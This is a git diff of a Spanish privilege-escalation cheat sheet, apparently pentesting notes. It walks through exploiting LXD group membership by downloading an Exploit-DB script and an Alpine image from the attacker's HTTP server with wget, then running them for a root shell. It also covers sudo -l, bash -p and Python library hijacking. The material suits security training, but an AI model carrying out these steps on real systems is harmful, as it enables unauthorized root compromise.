@@ -93,12 +93,14 @@ Ver a que grupos pertece el usuario actual. En caso de que este dentro del grupo
 Explotación del grupo lxd.
 - Lo primero que se tiene que hacer es buscar con searchsploit un script que te ayude a explotar la vulnerabilidad del lxd. 
 - Despues copias el exploit a la ruta actual de trabajo.
-- Mueves el exploit a un archivo con nombre descriptivo con la misma extensión(exploit_lxd.sh), abres el exploit, eliminas la linea 22 y añades la siguiente linea -> lxc image list y lo guardas.
+- Mueves el exploit a un archivo con nombre descriptivo con la misma extensión(exploitlxd.sh), abres el exploit, eliminas la linea 22 y añades la siguiente linea -> lxc image list y lo guardas.
 - Te descargas el lxd alpine builder como completmento para la explotación. 
 - Ejecutas el siguiente comando como el usuario root sudo bash build-alphine.
 - Te compartes un servicio http por el puerto 80 para traladar el exploit y el alpine.tar.gz a la maquina víctima.
-- Ingresas a un directorio que tenga capacidad de escritura para no tener problemas al traladar el exploit_lxd.sh y con wget te tranfieres el exploit_lxd.sh y el alpine.tar.gz 
-- Le asignas permisos de ejecución al exploit.lxd_sh, lo ejecutas y obtendras una consola como el usuario root.
+- Ingresas a un directorio que tenga capacidad de escritura para no tener problemas al traladar el exploitlxd.sh y con wget te tranfieres el exploitlxd.sh y el alpine.tar.gz 
+- Le asignas permisos de ejecución al exploitlxd.sh, lo ejecutas y obtendras una consola como el usuario root.
+
+
 ```
 searchsploit lxd -> linux/local/46978.sh
 searchsploit -m linux/local/46978.sh .
@@ -108,18 +110,18 @@ sudo bash build-alpine
 sudo python3 -m http.server 80
 
 cd /tmp 
-wget http://<tu-ip-address>/exploit_lxd.sh
+wget http://<tu-ip-address>/exploitlxd.sh
 wget http://<tu-ip-address>/alpine-v3.16-x86_64-20220817_1533.tar.gz
-chmod +x exploit_lxd.sh
-./exploit_lxd.sh
+chmod +x exploitlxd.sh
+./exploitlxd.sh
 ```
-<br><br>
+<br>
 ## su root.
 En caso de que tengas contraseñas puedes reutilizarlas con este comando y si son las correctas puedes convertirte en superusuario.
 ```
 su root
 ```
-<br><br>
+<br>
 ## sudo -l.
 Ver si hay binarios que se puedan ejecutar como el usuario root sin proporcionar la contraseña. En caso de encontrar un binario con este comando puedes apoyarte de el sitio web GTFOBins el cual te muestra como puedes llegar a escalar privilegios por medio de un binario.
 ```
@@ -131,7 +133,7 @@ Si al ejecutar el sudo -l vez que el usuario actual tiene todos los privilegios 
 sudo -l -> ALL/ALL
 bash -p 
 ```
-<br><br>
+<br>
 ## Library Hijacking.
 Consiste en suplantar una librería de python que un script.py importe al ejecutarse.<br>
 ¿Como se realiza esta técnica? Lo primero que tendras que hacer es identificar un script.py que se ejecute en el sistema, abres el script.py y revisas que librerías esta importando el script.py.<br> Una vez que hallaz identificado las librerías que se importan lo que vas a hacer es crear un script.py pero con el nombre de una de las librerías que importa el script. Dentro de la librería que acabas de crear vas a añadir código malicioso que te permita cambiar los privilegios de la bash. Lo que hace el script.py al ejecutarse es que al importar las librerías sigue un orden que depende del path(secuencia de directorios que se recorren para llegar a un archivo). Por lo regular parte de la ruta actual donde se sitúa y de allí recorre los demas directorios en busca de las librerías.<br>
